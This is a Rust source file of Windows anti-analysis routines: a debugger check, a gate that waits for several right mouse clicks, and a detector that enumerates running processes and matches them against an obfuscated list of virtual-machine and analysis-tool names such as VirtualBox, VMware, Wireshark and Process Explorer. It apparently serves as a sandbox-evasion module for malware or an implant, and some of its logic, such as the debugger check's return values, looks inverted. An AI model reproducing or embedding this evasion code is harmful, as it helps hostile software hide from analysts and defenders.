use winapi::um::winnt::{PROCESS_QUERY_INFORMATION,PROCESS_VM_READ};
use winapi::um::winuser::{GetAsyncKeyState, VK_RBUTTON};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::debugapi::IsDebuggerPresent;
use winapi::um::psapi:: GetModuleBaseNameA;
use winapi::um::psapi::EnumProcessModules;
//use winapi::um::handleapi::CloseHandle;
use winapi::um::psapi::EnumProcesses;
use winapi::um::synchapi::Sleep;
//use winapi::um::winnt::HANDLE;
use winapi::shared::minwindef::DWORD;
use winapi::shared::minwindef::HMODULE;
use std::ptr::null_mut;

use obfstr::obfstr;



pub fn debugger()->bool 
{
    unsafe {
        match IsDebuggerPresent() {
            0 => {
               return true;
            },
            _ => {
               return false;
            }
        }
    }
}


pub fn mouse_clicks(min: u32)->bool
{
    let mut count: u32 = 0;

    while count < min 
    {
        let key_left_clicked = unsafe { GetAsyncKeyState(VK_RBUTTON) };
        if key_left_clicked >> 15 == -1 
        {
            count += 1;
        }
        if count >= min{return true}
        unsafe { Sleep(100) };
    }
    return false
}
//


pub fn is_not_vm()->bool
{
    let naughty:Vec<String> = [
        obfstr!("vbox.exe").to_string(),
        obfstr!("vmvss").to_string(),
        obfstr!("vmscsi").to_string(),
        obfstr!("vmxnet").to_string(),
        obfstr!("vmx_svga").to_string(),
        obfstr!("vmhgfs").to_string(),
        obfstr!("vmmemctl").to_string(),
         obfstr!("vmsrvc.exe").to_string(),
         obfstr!("tcpview.exe").to_string(),
         obfstr!("wireshark.exe").to_string(),
         obfstr!("fiddler.exe").to_string(),
         obfstr!("vmware.exe").to_string(),
         obfstr!("VirtualBox.exe").to_string(),
         obfstr!("procexp.exe").to_string(),
         obfstr!("autoit.exe").to_string(),
         obfstr!("vboxtray.exe").to_string(),
         obfstr!("vmtoolsd.exe").to_string(),
         obfstr!("vmrawdsk.sys.").to_string(),
         obfstr!("vmusbmouse.sys.").to_string(),
         obfstr!("df5serv.exe").to_string(),
         obfstr!("vboxservice.exe").to_string(),].to_vec();
    let wproc:Vec<String> = proclist(getpid());

    for i in wproc.iter()
    {
        for j in naughty.iter()
        {
            if i.to_lowercase() == j.to_lowercase()
            {
               return false
            }
        }
    }
    
return true;
}


fn getpid()->Vec<u32>//pids list
{
let cbneed = 0u32;
let mut pids: Vec<DWORD> = Vec::with_capacity(1024);
let mut i = 0;
    while i < 1024 
    {
        pids.push(0u32);
        i += 1;
    }

    if unsafe { EnumProcesses(pids.as_ptr() as *mut u32, 1024, cbneed as *mut u32) } !=0
{
    return pids;
}

return pids;
}





fn proclist(pids:Vec<u32>)->Vec<String>//process list
{
        let mut procs:Vec<String> = Vec::new();
        let mut hmodule:HMODULE = null_mut();
        let mut bzname:Vec<i8> = Vec::new();
        let mut i = 0;
        while i <= 18
        {
            bzname.push(0);
            i+=1;
        }

    for pid in pids.iter()
    {
        if pid != &0
        {
            
            let hprocess = unsafe{OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, *pid)};
            if hprocess != null_mut()
            {

                if unsafe{EnumProcessModules(hprocess, &mut hmodule,  std::mem::size_of::<HMODULE>() as u32, &mut 0u32)} != 0
                {
                    if unsafe{GetModuleBaseNameA(hprocess, hmodule, bzname.as_mut_ptr(), 18)} !=0
                    {
                        match String::from_utf8(unsafe{std::mem::transmute(bzname.to_owned())})
                        {
                            Ok(name)=>
                            {
                                let name = name.split("\0").collect::<Vec<_>>()[0].to_string();
                                procs.push(name);
                            },
                            Err(_error)=> (),
                        }
                       
                    }

                }

            }
            
        }
    }
    return procs;
}